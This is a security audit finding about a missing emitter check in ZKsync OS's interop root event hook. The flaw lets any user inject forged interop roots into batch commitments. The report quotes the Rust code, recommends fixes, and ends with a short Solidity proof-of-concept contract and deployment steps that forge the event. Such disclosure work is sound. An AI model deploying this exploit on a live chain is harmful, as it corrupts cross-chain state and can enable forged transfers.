### Title
Missing Emitter Address Validation in `interop_root_reporter_event_hook` Allows Arbitrary Interop Root Injection - (File: `system_hooks/src/event_hooks/interop_root_reporter.rs`)

### Summary

The `interop_root_reporter_event_hook` function processes `InteropRootAdded` events and stores the parsed `chain_id`, `block_or_batch_number`, and `root` into the system's interop root storage, which feeds the `interop_roots_rolling_hash` in the batch commitment. The hook validates only the event signature (topic[0]) but never checks which contract emitted the event. Because any EVM contract can emit any event with any signature, an unprivileged user can deploy a contract that emits `InteropRootAdded(uint256,uint256,bytes32[])` with fully attacker-controlled `chain_id`, `block_or_batch_number`, and `root` values, injecting arbitrary interop roots into the batch output committed to the settlement layer. Additionally, the hook does not validate that `chain_id` is non-zero, despite the `InteropRoot` struct explicitly documenting this as a required invariant.

### Finding Description

`interop_root_reporter_event_hook` in `system_hooks/src/event_hooks/interop_root_reporter.rs` is an event hook that fires whenever any contract emits an event whose first topic matches `INTEROP_ROOT_ADDED_EVENT_SIG`. The function signature is:

```rust
pub fn interop_root_reporter_event_hook<S: EthereumLikeTypes>(
    topics: &arrayvec::ArrayVec<..., MAX_EVENT_TOPICS>,
    data: &[u8],
    _caller_ee: u8,
    system: &mut System<S>,
    resources: &mut S::Resources,
) -> Result<(), SystemError>
```

There is no `emitter` or `caller_address` parameter. The hook performs the following checks:
- `topics[0]` matches `INTEROP_ROOT_ADDED_EVENT_SIG` [1](#0-0) 
- `data.len() == 96` [2](#0-1) 
- ABI offset equals 32 [3](#0-2) 
- Array length equals 1 [4](#0-3) 
- `topics.len() == 3` [5](#0-4) 

After these checks, `chain_id` and `block_or_batch_number` are read directly from topics[1] and topics[2] and passed to `add_interop_root` without any further validation:

```rust
let root = Bytes32::from_array(data[64..96].try_into().unwrap());
let chain_id = U256::from_be_bytes(topics[1].as_u8_array());
let block_or_batch_number = U256::from_be_bytes(topics[2].as_u8_array());
system.io.add_interop_root(
    ExecutionEnvironmentType::NoEE,
    resources,
    InteropRoot { root, block_or_batch_number, chain_id },
)?;
``` [6](#0-5) 

The `InteropRoot` struct documents that `chain_id` "must be non-zero" and `root` "cannot be zero for valid roots", but neither constraint is enforced in the hook: [7](#0-6) 

The `push_root` method in `InteropRootStorage` also performs no validation: [8](#0-7) 

These injected roots are then consumed by `calculate_interop_roots_rolling_hash` to produce the `interop_roots_rolling_hash` field of `BatchOutput`, which is committed to the settlement layer: [9](#0-8) [10](#0-9) 

### Impact Explanation

An attacker who injects fake interop roots corrupts the `interop_roots_rolling_hash` committed to the settlement layer. Depending on how the settlement layer uses this hash to verify cross-chain messages or asset transfers, this can enable:

1. **Forged cross-chain state commitments**: The settlement layer receives a rolling hash that includes attacker-controlled `chain_id` and `block_or_batch_number` values, potentially allowing the attacker to forge the appearance of cross-chain messages from arbitrary chains.
2. **Denial of service for legitimate interop**: Injecting roots with `chain_id = 0` or duplicate `(chain_id, block_or_batch_number)` pairs can corrupt the rolling hash in ways that cause legitimate cross-chain operations to fail verification on the settlement layer.
3. **State-transition divergence**: The forward execution and proving execution will both accept the fake roots (since neither checks the emitter), but the resulting batch commitment will be incorrect relative to the intended protocol semantics.

### Likelihood Explanation

Likelihood is high. The attack requires only:
1. Deploying a contract that emits `InteropRootAdded(uint256,uint256,bytes32[])` — a standard EVM `LOG3` opcode call with the correct topic[0] hash.
2. Calling that contract in any transaction.

No privileged access, leaked keys, or governance majority is required. Any unprivileged L2 user can execute this in a single transaction.

### Recommendation

1. **Add emitter address check**: Pass the emitter address into the event hook and reject events not originating from the authorized `L2_INTEROP_ROOT_STORAGE_ADDRESS` contract. This is the primary fix.
2. **Validate `chain_id` is non-zero**: Enforce the documented invariant in the hook before calling `add_interop_root`.
3. **Validate `root` is non-zero**: Enforce the documented invariant in the hook (currently only tested at the contract level, not the hook level).
4. **Validate `block_or_batch_number`**: Consider whether zero or other sentinel values should be rejected.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract FakeInteropRootEmitter {
    // InteropRootAdded(uint256,uint256,bytes32[])
    bytes32 constant SIG = 0x6b451b8422636e45b93bf7f594fa2c1769d039766c4254a6e7f9c0ee1715cdb0;

    function inject(uint256 fakeChainId, uint256 fakeBatchNumber, bytes32 fakeRoot) external {
        // Emit the event with attacker-controlled chain_id and block_or_batch_number
        // ABI encoding: offset=32, length=1, root=fakeRoot
        bytes memory data = abi.encode(uint256(32), uint256(1), fakeRoot);
        assembly {
            // LOG3(data, SIG, fakeChainId, fakeBatchNumber)
            log3(add(data, 32), mload(data), SIG, fakeChainId, fakeBatchNumber)
        }
    }
}
```

1. Deploy `FakeInteropRootEmitter` on the ZKsync OS L2.
2. Call `inject(0, 0, 0x0101...01)` — this emits `InteropRootAdded` with `chain_id=0` (violating the documented invariant) and arbitrary `block_or_batch_number`.
3. The `interop_root_reporter_event_hook` fires, passes all structural checks, and calls `add_interop_root` with the attacker-supplied values.
4. The fake root is included in `interop_roots_rolling_hash` in the batch commitment output, corrupting the settlement layer's view of cross-chain state.

### Citations

**File:** system_hooks/src/event_hooks/interop_root_reporter.rs (L29-31)
```rust
    if topics.is_empty() || topics[0].as_u8_array() != INTEROP_ROOT_ADDED_EVENT_SIG {
        return Ok(());
    }
```

**File:** system_hooks/src/event_hooks/interop_root_reporter.rs (L33-35)
```rust
    if data.len() != 96 {
        return Err(internal_error!("Interop root reporter event hook received bad data").into());
    }
```

**File:** system_hooks/src/event_hooks/interop_root_reporter.rs (L38-49)
```rust
    let offset: u32 = match U256::from_be_slice(&data[..32]).try_into() {
        Ok(offset) => offset,
        Err(_) => {
            return Err(
                internal_error!("Interop root reporter event hook received bad offset").into(),
            );
        }
    };
    // This event is part of the system, but we check it anyways
    if offset != 32 {
        return Err(internal_error!("Interop root reporter event hook received bad offset").into());
    }
```

**File:** system_hooks/src/event_hooks/interop_root_reporter.rs (L51-62)
```rust
    let len: u32 = match U256::from_be_slice(&data[32..64]).try_into() {
        Ok(offset) => offset,
        Err(_) => {
            return Err(
                internal_error!("Interop root reporter event hook received bad length").into(),
            );
        }
    };
    // It should have exactly one side
    if len != 1 {
        return Err(internal_error!("Interop root reporter event hook received bad length").into());
    }
```

**File:** system_hooks/src/event_hooks/interop_root_reporter.rs (L63-66)
```rust
    // Validate topics length
    if topics.len() != 3 {
        return Err(internal_error!("Interop root reporter event hook received bad topics").into());
    }
```

**File:** system_hooks/src/event_hooks/interop_root_reporter.rs (L68-79)
```rust
    let root = Bytes32::from_array(data[64..96].try_into().unwrap());
    let chain_id = U256::from_be_bytes(topics[1].as_u8_array());
    let block_or_batch_number = U256::from_be_bytes(topics[2].as_u8_array());
    system.io.add_interop_root(
        ExecutionEnvironmentType::NoEE,
        resources,
        InteropRoot {
            root,
            block_or_batch_number,
            chain_id,
        },
    )?;
```

**File:** zk_ee/src/common_structs/interop_root_storage.rs (L14-21)
```rust
pub struct InteropRoot {
    /// The merkle root hash (cannot be zero for valid roots)
    pub root: Bytes32,
    /// Block or batch number from the source chain
    pub block_or_batch_number: U256,
    /// Source chain identifier (must be non-zero)
    pub chain_id: U256,
}
```

**File:** zk_ee/src/common_structs/interop_root_storage.rs (L41-45)
```rust
    pub fn push_root(&mut self, interop_root: InteropRoot) -> Result<(), SystemError> {
        self.list.push(interop_root, ());

        Ok(())
    }
```

**File:** basic_bootloader/src/bootloader/block_flow/zk/post_tx_op/mod.rs (L107-128)
```rust
pub fn calculate_interop_roots_rolling_hash<'a>(
    old_rolling_hash: Bytes32,
    roots: impl Iterator<Item = &'a InteropRoot>,
    hasher: &mut crypto::sha3::Keccak256,
) -> Bytes32 {
    let mut data = [0u8; 96];

    let mut rolling_hash = old_rolling_hash;
    for root in roots {
        data[0..32].copy_from_slice(&rolling_hash.as_u8_ref());
        data[32..64].copy_from_slice(&root.chain_id.to_be_bytes::<{ U256::BYTES }>());
        data[64..96].copy_from_slice(&root.block_or_batch_number.to_be_bytes::<{ U256::BYTES }>());
        hasher.update(data);

        // Note: now we have only one side
        hasher.update(root.root.as_u8_ref());

        rolling_hash = hasher.finalize_reset().into()
    }

    rolling_hash
}
```

**File:** basic_bootloader/src/bootloader/block_flow/zk/post_tx_op/public_input.rs (L76-79)
```rust
    /// Linear keccak256 hash of interop roots
    pub interop_roots_rolling_hash: Bytes32,
    /// Settlement layer chain id.
    pub settlement_layer_chain_id: U256,
```
